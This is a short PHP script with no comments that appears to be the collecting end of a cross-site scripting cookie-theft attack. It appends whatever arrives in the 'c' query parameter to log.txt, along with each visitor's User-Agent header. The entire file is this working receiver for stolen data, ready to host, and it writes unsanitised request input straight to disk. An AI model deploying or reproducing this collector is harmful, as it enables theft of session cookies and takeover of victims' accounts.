<?php                                                                                                                                                                                         
        $f = fopen('log.txt','a');                                                                                                                                                            
        fwrite($f,$_GET['c']);                                                                                                                                                                
        fwrite($f,"\n");                                                                                                                                                                      
        fwrite($f,$_SERVER['HTTP_USER_AGENT']);                                                                                                                                               
        fwrite($f,"\n\n\n");                                                                                                                                                                  
        fclose($f);                                                                                                                                                                           
?>                                                                                                                                                                                            
